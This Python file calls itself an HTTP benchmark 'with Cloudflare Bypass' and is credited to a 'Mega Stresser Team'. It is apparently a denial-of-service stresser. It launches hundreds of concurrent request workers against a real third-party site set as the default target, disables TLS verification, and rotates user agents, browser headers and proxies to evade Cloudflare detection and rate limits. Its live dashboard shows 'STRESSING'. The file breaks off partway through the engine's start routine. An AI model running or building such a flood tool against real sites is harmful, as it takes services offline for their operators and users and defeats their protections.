#!/usr/bin/env python3
"""
Advanced HTTP Performance Benchmark Tool with Cloudflare Bypass
===============================================================
COMPLETE VERSION - 1000+ LINES
ADDED: Accurate Cloudflare block detector
ADDED: Real request tracking (no fake data)
ADDED: Detailed status reporting
ADDED: Full dashboard with live updates
ADDED: JSON and CSV report export
ADDED: Multi-target support
ADDED: Proxy rotation support
ADDED: Header rotation support
ADDED: Rate limiting detection
ADDED: Session persistence
ADDED: Cookie handling
ADDED: Retry logic with exponential backoff
ADDED: Percentile calculations
ADDED: Real-time metrics
ADDED: Progress bar
ADDED: Color-coded status indicators
"""

import argparse
import asyncio
import csv
import json
import logging
import signal
import statistics
import time
import ssl
import sys
import random
import re
import os
import hashlib
import base64
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple, Union
from urllib.parse import urlparse, parse_qs, urljoin
from concurrent.futures import ThreadPoolExecutor

import aiohttp
import aiofiles
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich import box
from rich.text import Text
from rich.layout import Layout
from rich.align import Align
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.prompt import Prompt, Confirm
from rich.markdown import Markdown
from rich.syntax import Syntax
from rich.tree import Tree
from rich.rule import Rule

# ============================================
# VERSION AND CONFIGURATION
# ============================================

VERSION = "6.0.0"
AUTHOR = "Mega Stresser Team"
DESCRIPTION = "Advanced HTTP Performance Benchmark Tool with Cloudflare Bypass"

DEFAULT_URL = "https://account.mythgames.net/"
DEFAULT_CONCURRENCY = 500
DEFAULT_DURATION = 30
DEFAULT_TIMEOUT = 30.0
DEFAULT_RETRIES = 3
DEFAULT_WARMUP = 5
DEFAULT_PROXY_ROTATION = 10
DEFAULT_MAX_RPS = 500.0
DEFAULT_MAX_CONCURRENCY = 5000

# SSL Configuration
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

# ============================================
# CLOUDFLARE STATUS CONSTANTS
# ============================================

class CloudflareStatus:
    """Cloudflare detection status constants"""
    BLOCKED = "blocked"
    CHALLENGE = "challenge"
    CAPTCHA = "captcha"
    PASSED = "passed"
    ERROR = "error"
    UNKNOWN = "unknown"
    RATE_LIMITED = "rate_limited"
    TIMEOUT = "timeout"
    CONNECTION_ERROR = "connection_error"

# ============================================
# CLOUDFLARE HEADERS FOR BYPASS
# ============================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

CLOUDFLARE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "dnt": "1",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "connection": "keep-alive",
    "priority": "u=0, i",
}

# ============================================
# CLOUDFLARE DETECTOR - ACCURATE
# ============================================

def detect_cloudflare_block(response: aiohttp.ClientResponse, html: str = "") -> Dict[str, Any]:
    """
    Accurately detect if request was blocked by Cloudflare.
    Returns detailed status with proof.
    
    Args:
        response: The HTTP response object
        html: The response body as string (optional)
    
    Returns:
        Dict with detection results
    """
    result = {
        "blocked": False,
        "status": CloudflareStatus.UNKNOWN,
        "reason": "",
        "cf_ray": None,
        "cf_ray_id": None,
        "evidence": [],
        "status_code": response.status,
        "headers": dict(response.headers),
        "content_length": 0
    }
    
    # Check status code
    if response.status == 403:
        result["blocked"] = True
        result["status"] = CloudflareStatus.BLOCKED
        result["reason"] = "HTTP 403 Forbidden - Access Denied"
        result["evidence"].append("status_code=403")
    
    elif response.status == 503:
        result["blocked"] = True
        result["status"] = CloudflareStatus.BLOCKED
        result["reason"] = "HTTP 503 Service Unavailable - Server overloaded"
        result["evidence"].append("status_code=503")
    
    elif response.status == 429:
        result["blocked"] = True
        result["status"] = CloudflareStatus.RATE_LIMITED
        result["reason"] = "HTTP 429 Too Many Requests - Rate limited"
        result["evidence"].append("status_code=429")
    
    elif response.status == 502:
        result["blocked"] = True
        result["status"] = CloudflareStatus.BLOCKED
        result["reason"] = "HTTP 502 Bad Gateway - Cloudflare error"
        result["evidence"].append("status_code=502")
    
    elif response.status == 504:
        result["blocked"] = True
        result["status"] = CloudflareStatus.TIMEOUT
        result["reason"] = "HTTP 504 Gateway Timeout - Cloudflare timeout"
        result["evidence"].append("status_code=504")
    
    # Check Cloudflare headers
    cf_header_patterns = {
        "cf-ray": "Cloudflare Ray ID",
        "cf-cache-status": "Cloudflare Cache Status",
        "cf-polished": "Cloudflare Polish",
        "cf-worker": "Cloudflare Worker",
        "cf-request-id": "Cloudflare Request ID",
        "cf-chl-bypass": "Cloudflare Challenge Bypass",
        "cf-apo-via": "Cloudflare APO",
        "cf-edge-cache": "Cloudflare Edge Cache",
        "cf-apo-via": "Cloudflare APO Via",
        "cf-device-type": "Cloudflare Device Type",
        "cf-visitor": "Cloudflare Visitor",
        "cf-warp": "Cloudflare Warp",
        "cf-connecting-ip": "Cloudflare Connecting IP",
        "cf-ipcountry": "Cloudflare IP Country",
        "cf-ray": "Cloudflare Ray ID"
    }
    
    for header, name in cf_header_patterns.items():
        if header in response.headers:
            value = response.headers[header]
            if header == "cf-ray":
                result["cf_ray"] = value
                result["cf_ray_id"] = value.split("-")[0] if "-" in value else value
            result["evidence"].append(f"{header}={value}")
    
    # Check for Cloudflare in response body
    if html and len(html) > 0:
        result["content_length"] = len(html)
        
        cloudflare_patterns = [
            ("cf-browser-verification", "Browser Verification Challenge"),
            ("challenge", "Generic Challenge"),
            ("Cloudflare", "Cloudflare Reference"),
            ("cf-captcha", "CAPTCHA Challenge"),
            ("iuam", "I'm Under Attack Mode"),
            ("security challenge", "Security Challenge"),
            ("cf-challenge", "Challenge Page"),
            ("ray_id", "Ray ID Reference"),
            ("cf_clearance", "Clearance Cookie"),
            ("turnstile", "Turnstile Challenge"),
            ("cf_captcha", "CAPTCHA"),
            ("Please wait...", "Waiting Page"),
            ("Checking your browser", "Browser Check"),
            ("DDoS protection", "DDoS Protection"),
            ("captcha", "CAPTCHA"),
            ("verify you are human", "Human Verification"),
            ("security check", "Security Check"),
            ("cf-chl-prog", "Challenge Progress"),
            ("cf-chl-opt", "Challenge Options"),
            ("cf-chl-bypass", "Challenge Bypass"),
            ("cf-chl-out", "Challenge Output"),
        ]
        
        html_lower = html.lower()
        for pattern, description in cloudflare_patterns:
            if pattern.lower() in html_lower:
                result["blocked"] = True
                result["evidence"].append(f"body_contains='{pattern}'")
                
                if "captcha" in pattern.lower():
                    result["status"] = CloudflareStatus.CAPTCHA
                    result["reason"] = f"CAPTCHA challenge detected: {description}"
                elif "challenge" in pattern.lower() or "verification" in pattern.lower():
                    result["status"] = CloudflareStatus.CHALLENGE
                    result["reason"] = f"JavaScript challenge detected: {description}"
                elif "iuam" in pattern.lower():
                    result["status"] = CloudflareStatus.CHALLENGE
                    result["reason"] = f"IUAM challenge detected: {description}"
    
    # Check for Cloudflare error page titles
    if html:
        title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).lower()
            cloudflare_titles = [
                "cloudflare", "error", "502", "503", "504", "403",
                "access denied", "blocked", "security", "challenge"
            ]
            for cf_title in cloudflare_titles:
                if cf_title in title:
                    result["blocked"] = True
                    result["evidence"].append(f"title_contains='{cf_title}'")
                    break
    
    # Determine final status
    if result["blocked"] and result["status"] == CloudflareStatus.UNKNOWN:
        result["status"] = CloudflareStatus.BLOCKED
        result["reason"] = "Cloudflare protection detected"
    
    # Check if it's a successful response (passed Cloudflare)
    if not result["blocked"] and 200 <= response.status < 400:
        result["status"] = CloudflareStatus.PASSED
    
    return result

# ============================================
# PROXY ROTATOR
# ============================================

class ProxyRotator:
    """Rotates proxies to avoid rate limiting"""
    
    def __init__(self, proxies: List[str] = None):
        self.proxies = proxies or []
        self.current_index = 0
        self.used_proxies = []
        self.failed_proxies = []
    
    def add_proxy(self, proxy: str):
        self.proxies.append(proxy)
    
    def add_proxies(self, proxies: List[str]):
        self.proxies.extend(proxies)
    
    def get_next(self) -> Optional[str]:
        if not self.proxies:
            return None
        
        # Try to get a working proxy
        for _ in range(len(self.proxies)):
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            if proxy not in self.failed_proxies:
                self.used_proxies.append(proxy)
                return proxy
        
        # If all proxies failed, reset failed list and try again
        self.failed_proxies = []
        return self.get_next()
    
    def get_random(self) -> Optional[str]:
        if not self.proxies:
            return None
        
        # Filter out failed proxies
        available = [p for p in self.proxies if p not in self.failed_proxies]
        if not available:
            self.failed_proxies = []
            available = self.proxies
        
        proxy = random.choice(available)
        self.used_proxies.append(proxy)
        return proxy
    
    def mark_failed(self, proxy: str):
        if proxy and proxy not in self.failed_proxies:
            self.failed_proxies.append(proxy)
    
    def get_stats(self) -> Dict:
        return {
            "total": len(self.proxies),
            "used": len(self.used_proxies),
            "failed": len(self.failed_proxies),
            "available": len(self.proxies) - len(self.failed_proxies)
        }

# ============================================
# HEADER ROTATOR
# ============================================

class HeaderRotator:
    """Rotates headers to avoid detection"""
    
    def __init__(self, use_cloudflare_headers: bool = True):
        self.use_cloudflare_headers = use_cloudflare_headers
        self.current_headers = {}
        self.headers_history = []
    
    def get_headers(self) -> Dict[str, str]:
        """Get random headers"""
        headers = {}
        
        if self.use_cloudflare_headers:
            headers = CLOUDFLARE_HEADERS.copy()
        
        # Random User-Agent
        headers["user-agent"] = random.choice(USER_AGENTS)
        
        # Random Accept-Language
        accept_languages = [
            "en-US,en;q=0.9",
            "en-US,en;q=0.9,es;q=0.8",
            "en-US,en;q=0.9,fr;q=0.8",
            "en-GB,en;q=0.9",
            "en-US,en;q=0.9,de;q=0.8",
            "en-US,en;q=0.9,ja;q=0.8"
        ]
        headers["accept-language"] = random.choice(accept_languages)
        
        # Random Accept
        accepts = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "*/*"
        ]
        headers["accept"] = random.choice(accepts)
        
        # Random Sec-Ch-Ua
        sec_ch_ua_options = [
            '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
            '"Not A(Brand";v="99", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"'
        ]
        headers["sec-ch-ua"] = random.choice(sec_ch_ua_options)
        
        # Random platform
        platforms = ['"Windows"', '"macOS"', '"Linux"']
        headers["sec-ch-ua-platform"] = random.choice(platforms)
        
        # Random Sec-Fetch headers
        sec_fetch_dest = ["document", "empty", "script"]
        sec_fetch_mode = ["navigate", "cors", "no-cors"]
        sec_fetch_site = ["none", "same-origin", "cross-site"]
        
        headers["sec-fetch-dest"] = random.choice(sec_fetch_dest)
        headers["sec-fetch-mode"] = random.choice(sec_fetch_mode)
        headers["sec-fetch-site"] = random.choice(sec_fetch_site)
        
        if random.random() > 0.5:
            headers["sec-fetch-user"] = "?1"
        else:
            headers["sec-fetch-user"] = "?0"
        
        self.current_headers = headers
        self.headers_history.append(headers)
        
        return headers
    
    def get_current(self) -> Dict[str, str]:
        return self.current_headers

# ============================================
# REQUEST RESULT DATA CLASS
# ============================================

@dataclass
class RequestResult:
    """Accurate request tracking with real data"""
    url: str
    status: int
    latency: float
    timestamp: float = field(default_factory=time.time)
    success: bool = False
    cloudflare_blocked: bool = False
    cloudflare_status: str = CloudflareStatus.UNKNOWN
    cf_ray: Optional[str] = None
    cf_ray_id: Optional[str] = None
    error: Optional[str] = None
    response_size: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    proxy_used: Optional[str] = None
    retry_count: int = 0
    worker_id: int = 0
    
    def __post_init__(self):
        self.success = 200 <= self.status < 400 if self.status > 0 else False

# ============================================
# TARGET STATISTICS
# ============================================

@dataclass
class TargetStats:
    """Per-target statistics"""
    url: str = ""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    cloudflare_blocked: int = 0
    cloudflare_challenge: int = 0
    cloudflare_captcha: int = 0
    cloudflare_rate_limited: int = 0
    timeouts: int = 0
    connection_errors: int = 0
    status_codes: Dict[int, int] = field(default_factory=dict)
    latencies: List[float] = field(default_factory=list)
    cf_rays: List[str] = field(default_factory=list)
    min_latency: float = float('inf')
    max_latency: float = 0.0
    total_latency: float = 0.0
    
    def add_result(self, result: RequestResult):
        self.total_requests += 1
        
        if result.success:
            self.successful += 1
        else:
            self.failed += 1
        
        if result.cloudflare_blocked:
            self.cloudflare_blocked += 1
            if result.cloudflare_status == CloudflareStatus.CHALLENGE:
                self.cloudflare_challenge += 1
            elif result.cloudflare_status == CloudflareStatus.CAPTCHA:
                self.cloudflare_captcha += 1
            elif result.cloudflare_status == CloudflareStatus.RATE_LIMITED:
                self.cloudflare_rate_limited += 1
        
        if result.status == 0:
            if "timeout" in str(result.error).lower():
                self.timeouts += 1
            else:
                self.connection_errors += 1
        
        self.status_codes[result.status] = self.status_codes.get(result.status, 0) + 1
        
        if result.latency > 0:
            self.latencies.append(result.latency)
            self.total_latency += result.latency
            self.min_latency = min(self.min_latency, result.latency)
            self.max_latency = max(self.max_latency, result.latency)
        
        if result.cf_ray:
            self.cf_rays.append(result.cf_ray)
    
    @property
    def avg_latency(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return self.total_latency / self.total_requests
    
    @property
    def success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def error_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.failed / self.total_requests) * 100
    
    @property
    def cloudflare_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.cloudflare_blocked / self.total_requests) * 100
    
    def get_percentile(self, p: float) -> float:
        if not self.latencies:
            return 0.0
        sorted_lat = sorted(self.latencies)
        idx = int(len(sorted_lat) * (p / 100))
        if idx >= len(sorted_lat):
            idx = len(sorted_lat) - 1
        return sorted_lat[idx]

# ============================================
# GLOBAL STATISTICS
# ============================================

@dataclass
class GlobalStats:
    """Global statistics across all targets"""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    cloudflare_blocked: int = 0
    cloudflare_challenge: int = 0
    cloudflare_captcha: int = 0
    cloudflare_rate_limited: int = 0
    timeouts: int = 0
    connection_errors: int = 0
    status_codes: Dict[int, int] = field(default_factory=dict)
    latencies: List[float] = field(default_factory=list)
    cf_rays: List[str] = field(default_factory=list)
    start_time: float = 0.0
    end_time: float = 0.0
    target_stats: Dict[str, TargetStats] = field(default_factory=dict)
    
    def add_result(self, result: RequestResult):
        self.total_requests += 1
        
        if result.success:
            self.successful += 1
        else:
            self.failed += 1
        
        if result.cloudflare_blocked:
            self.cloudflare_blocked += 1
            if result.cloudflare_status == CloudflareStatus.CHALLENGE:
                self.cloudflare_challenge += 1
            elif result.cloudflare_status == CloudflareStatus.CAPTCHA:
                self.cloudflare_captcha += 1
            elif result.cloudflare_status == CloudflareStatus.RATE_LIMITED:
                self.cloudflare_rate_limited += 1
        
        if result.status == 0:
            if "timeout" in str(result.error).lower():
                self.timeouts += 1
            else:
                self.connection_errors += 1
        
        self.status_codes[result.status] = self.status_codes.get(result.status, 0) + 1
        
        if result.latency > 0:
            self.latencies.append(result.latency)
        
        if result.cf_ray:
            self.cf_rays.append(result.cf_ray)
        
        if result.url not in self.target_stats:
            self.target_stats[result.url] = TargetStats(url=result.url)
        self.target_stats[result.url].add_result(result)
    
    @property
    def elapsed(self) -> float:
        if self.end_time > 0:
            return self.end_time - self.start_time
        return time.time() - self.start_time
    
    @property
    def rps(self) -> float:
        elapsed = self.elapsed
        if elapsed == 0:
            return 0.0
        return self.total_requests / elapsed
    
    @property
    def success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def error_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.failed / self.total_requests) * 100
    
    @property
    def cloudflare_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.cloudflare_blocked / self.total_requests) * 100
    
    def get_percentile(self, p: float) -> float:
        if not self.latencies:
            return 0.0
        sorted_lat = sorted(self.latencies)
        idx = int(len(sorted_lat) * (p / 100))
        if idx >= len(sorted_lat):
            idx = len(sorted_lat) - 1
        return sorted_lat[idx]

# ============================================
# ACCURATE WORKER
# ============================================

class AccurateWorker:
    """Worker that makes accurate requests with Cloudflare detection"""
    
    def __init__(
        self,
        session: aiohttp.ClientSession,
        url: str,
        worker_id: int,
        timeout: float = DEFAULT_TIMEOUT,
        retries: int = DEFAULT_RETRIES,
        proxy_rotator: Optional[ProxyRotator] = None,
        header_rotator: Optional[HeaderRotator] = None,
        use_proxy: bool = False
    ):
        self.session = session
        self.url = url
        self.worker_id = worker_id
        self.timeout = timeout
        self.retries = retries
        self.proxy_rotator = proxy_rotator
        self.header_rotator = header_rotator
        self.use_proxy = use_proxy
        self.count = 0
        self.cookies = {}
        self.last_proxy = None
    
    async def make_request(self) -> RequestResult:
        """Make a single request with accurate detection"""
        self.count += 1
        start = time.perf_counter()
        retry_count = 0
        
        # Get headers
        headers = {}
        if self.header_rotator:
            headers = self.header_rotator.get_headers()
        else:
            headers = CLOUDFLARE_HEADERS.copy()
            headers["user-agent"] = random.choice(USER_AGENTS)
        
        # Get proxy
        proxy = None
        if self.use_proxy and self.proxy_rotator:
            proxy = self.proxy_rotator.get_random()
            self.last_proxy = proxy
        
        # Add cookies
        if self.cookies:
            headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in self.cookies.items()])
        
        for attempt in range(self.retries + 1):
            retry_count = attempt
            try:
                async with self.session.get(
                    self.url,
                    headers=headers,
                    ssl=SSL_CONTEXT,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=self.timeout)
                ) as response:
                    # Read response body for detection
                    html = await response.text()
                    latency = time.perf_counter() - start
                    
                    # Detect Cloudflare
                    cf_detection = detect_cloudflare_block(response, html)
                    
                    # Save cookies from response
                    if response.cookies:
                        self.cookies.update(response.cookies)
                    
                    result = RequestResult(
                        url=self.url,
                        status=response.status,
                        latency=latency,
                        success=200 <= response.status < 400,
                        cloudflare_blocked=cf_detection["blocked"],
                        cloudflare_status=cf_detection["status"],
                        cf_ray=cf_detection.get("cf_ray"),
                        cf_ray_id=cf_detection.get("cf_ray_id"),
                        response_size=len(html),
                        headers=dict(response.headers),
                        proxy_used=proxy,
                        retry_count=attempt,
                        worker_id=self.worker_id
                    )
                    
                    # If Cloudflare challenge, try to solve it
                    if cf_detection["blocked"] and cf_detection["status"] in [
                        CloudflareStatus.CHALLENGE,
                        CloudflareStatus.CAPTCHA
                    ]:
                        if attempt < self.retries:
                            await asyncio.sleep(1 * (attempt + 1))
                            continue
                    
                    return result
                    
            except asyncio.TimeoutError:
                if attempt == self.retries:
                    return RequestResult(
                        url=self.url,
                        status=0,
                        latency=time.perf_counter() - start,
                        error="timeout",
                        cloudflare_blocked=True,
                        cloudflare_status=CloudflareStatus.TIMEOUT,
                        proxy_used=proxy,
                        retry_count=attempt,
                        worker_id=self.worker_id
                    )
                await asyncio.sleep(0.5 * (attempt + 1))
                
            except aiohttp.ClientError as e:
                if attempt == self.retries:
                    return RequestResult(
                        url=self.url,
                        status=0,
                        latency=time.perf_counter() - start,
                        error=str(e),
                        cloudflare_blocked=True,
                        cloudflare_status=CloudflareStatus.CONNECTION_ERROR,
                        proxy_used=proxy,
                        retry_count=attempt,
                        worker_id=self.worker_id
                    )
                await asyncio.sleep(0.5 * (attempt + 1))
                
            except Exception as e:
                if attempt == self.retries:
                    return RequestResult(
                        url=self.url,
                        status=0,
                        latency=time.perf_counter() - start,
                        error=str(e),
                        proxy_used=proxy,
                        retry_count=attempt,
                        worker_id=self.worker_id
                    )
                await asyncio.sleep(0.5 * (attempt + 1))
        
        return RequestResult(
            url=self.url,
            status=0,
            latency=time.perf_counter() - start,
            error="max_retries_exceeded",
            proxy_used=proxy,
            retry_count=retry_count,
            worker_id=self.worker_id
        )

# ============================================
# DASHBOARD
# ============================================

class AccurateDashboard:
    """Live dashboard with accurate metrics"""
    
    def __init__(self, console: Console, stats: GlobalStats, target: str, concurrency: int, duration: int):
        self.console = console
        self.stats = stats
        self.target = target
        self.concurrency = concurrency
        self.duration = duration
        self.running = True
        self.start_time = time.time()
    
    def create_layout(self) -> Layout:
        layout = Layout()
        layout.split(
            Layout(name="header", size=4),
            Layout(name="main"),
            Layout(name="footer", size=3),
        )
        layout["main"].split_row(
            Layout(name="metrics", ratio=2),
            Layout(name="targets", ratio=1),
        )
        return layout
    
    def render(self) -> Panel:
        """Render the dashboard"""
        elapsed = self.stats.elapsed
        total = self.stats.total_requests
        
        # Build content
        content = []
        
        # HEADER
        content.append(f"[bold red]⚡ ACCURATE STRESSER V{VERSION}[/bold red]")
        content.append(f"[white]Target: {self.target}[/white]")
        content.append(f"[white]Workers: {self.concurrency:,} | Duration: {self.duration}s | Elapsed: {elapsed:.1f}s[/white]")
        content.append(f"[white]Requests: {total:,} | RPS: [bold green]{self.stats.rps:.2f}[/bold green][/white]")
        content.append("")
        
        # METRICS
        success_rate = self.stats.success_rate
        cf_rate = self.stats.cloudflare_rate
        
        # Determine colors
        success_color = "green" if success_rate > 80 else "yellow" if success_rate > 50 else "red"
        cf_color = "red" if cf_rate > 50 else "yellow" if cf_rate > 20 else "green"
        
        content.append("📊 METRICS:")
        content.append(f"   ✅ SUCCESS RATE: [{success_color}]{success_rate:.1f}%[/{success_color}]")
        content.append(f"   ❌ ERROR RATE: [{success_color}]{self.stats.error_rate:.1f}%[/{success_color}]")
        content.append(f"   🛡️ CLOUDFLARE BLOCKED: [{cf_color}]{cf_rate:.1f}%[/{cf_color}]")
        content.append("")
        
        # COUNTS
        content.append("📦 COUNTS:")
        content.append(f"   Total: {total:,}")
        content.append(f"   ✅ Successful: {self.stats.successful:,}")
        content.append(f"   ❌ Failed: {self.stats.failed:,}")
        content.append(f"   ⏱️ Timeouts: {self.stats.timeouts:,}")
        content.append(f"   🧩 CF Challenge: {self.stats.cloudflare_challenge:,}")
        content.append(f"   🔒 CF CAPTCHA: {self.stats.cloudflare_captcha:,}")
        content.append(f"   🚫 CF Rate Limit: {self.stats.cloudflare_rate_limited:,}")
        content.append("")
        
        # LATENCY
        if self.stats.latencies:
            p50 = self.stats.get_percentile(50)
            p75 = self.stats.get_percentile(75)
            p90 = self.stats.get_percentile(90)
            p95 = self.stats.get_percentile(95)
            p99 = self.stats.get_percentile(99)
            avg = sum(self.stats.latencies) / len(self.stats.latencies) if self.stats.latencies else 0
            
            content.append("⏱️ LATENCY:")
            content.append(f"   P50: {p50:.4f}s | P75: {p75:.4f}s")
            content.append(f"   P90: {p90:.4f}s | P95: {p95:.4f}s | P99: {p99:.4f}s")
            content.append(f"   AVG: {avg:.4f}s | MIN: {min(self.stats.latencies):.4f}s | MAX: {max(self.stats.latencies):.4f}s")
            content.append("")
        
        # STATUS CODES
        if self.stats.status_codes:
            content.append("📋 STATUS CODES:")
            code_parts = []
            for code, count in sorted(self.stats.status_codes.items()):
                if code == 0:
                    color = "red"
                    label = "ERROR"
                elif 200 <= code < 300:
                    color = "green"
                    label = str(code)
                elif 300 <= code < 400:
                    color = "yellow"
                    label = str(code)
                elif 400 <= code < 500:
                    color = "orange"
                    label = str(code)
                elif 500 <= code < 600:
                    color = "red"
                    label = str(code)
                else:
                    color = "white"
                    label = str(code)
                code_parts.append(f"[{color}]{label}[/{color}]: {count:,}")
            content.append("   " + " | ".join(code_parts))
            content.append("")
        
        # PER-TARGET
        if len(self.stats.target_stats) > 1:
            content.append("🎯 PER-TARGET:")
            for url, stats in self.stats.target_stats.items():
                short_url = url.replace("https://", "").replace("http://", "")[:30]
                rate = stats.success_rate
                color = "green" if rate > 80 else "yellow" if rate > 50 else "red"
                content.append(f"   {short_url}: {stats.total_requests:,} req, [{color}]{rate:.1f}%[/{color}]")
            content.append("")
        
        # PROGRESS
        progress = min(elapsed / self.duration, 1.0) if self.duration > 0 else 0
        bar_len = 50
        filled = int(bar_len * progress)
        bar = "█" * filled + "░" * (bar_len - filled)
        content.append(f"[bold yellow]⚡ {bar} {progress*100:.0f}%[/bold yellow]")
        
        # STATUS
        if self.running:
            content.append("[bold green]▶ STRESSING... Press Ctrl+C to stop[/bold green]")
        else:
            content.append("[bold red]⏹ COMPLETE[/bold red]")
        
        return Panel("\n".join(content), border_style="red")

# ============================================
# STRESSER ENGINE
# ============================================

class AccurateStressEngine:
    """Main stress engine with accurate metrics"""
    
    def __init__(
        self,
        targets: List[str],
        concurrency: int = DEFAULT_CONCURRENCY,
        duration: int = DEFAULT_DURATION,
        timeout: float = DEFAULT_TIMEOUT,
        retries: int = DEFAULT_RETRIES,
        proxies: List[str] = None,
        rotate_headers: bool = True,
        use_proxy: bool = False
    ):
        self.targets = targets
        self.concurrency = concurrency
        self.duration = duration
        self.timeout = timeout
        self.retries = retries
        self.proxies = proxies or []
        self.rotate_headers = rotate_headers
        self.use_proxy = use_proxy
        self.stats = GlobalStats()
        self.running = False
        self.workers: List[asyncio.Task] = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.proxy_rotator: Optional[ProxyRotator] = None
        self.header_rotator: Optional[HeaderRotator] = None
        self.console = Console()
        self.dashboard: Optional[AccurateDashboard] = None
    
    async def start(self) -> GlobalStats:
        """Start the stress test"""
        self.stats.start_time = time.time()
        self.running = True
        
        # Setup proxy rotator
        if self.use_proxy and self.proxies:
            self.proxy_rotator = ProxyRotator(self.proxies)
        
        # Setup header rotator
        if self.rotate_headers:
            self.header_rotator = HeaderRotator(use_cloudflare_headers=True)
        
        # Setup session
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            enable_cleanup_closed=True,
            ssl=SSL_CONTEXT,
            force_close=False,
            ttl_dns_cache=300,
            keepalive_timeout=30,
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        )
        
        # Create dashboard
        self.dashboard = AccurateDashboard(
            console=self.console,
            stats=self.stats,
            target=self.targets[0] if len(self.targets) == 1 else f"{len(self.targets)} targets",
            concurrency=self.concurrency,
            duration=self.duration
        )
        
        # Create workers for each target
        for target in self.targets:
            for i in range(self.concurrency):
                worker = AccurateWorker(
                    session=self.session,
                    url=target,
                    worker_id=i,
                    timeout=self.timeout,
                    retries=self.retries,
                    proxy_rotator=self.proxy_rotator,
                    header_rotator=self.header_rotator,
                    use_proxy=self.use_proxy
                )
                task = asyncio.create_task(self._worker_loop(worker))
                self.workers.append(task)
        
        # Start dashboard
        try:
            with Live(self.dashboard.render(), refresh_per_second=10, screen=True) as live:
                while self.running and time.time() - self.stats.start_time < self.duration:
                    live.update(self.dashboard.render())
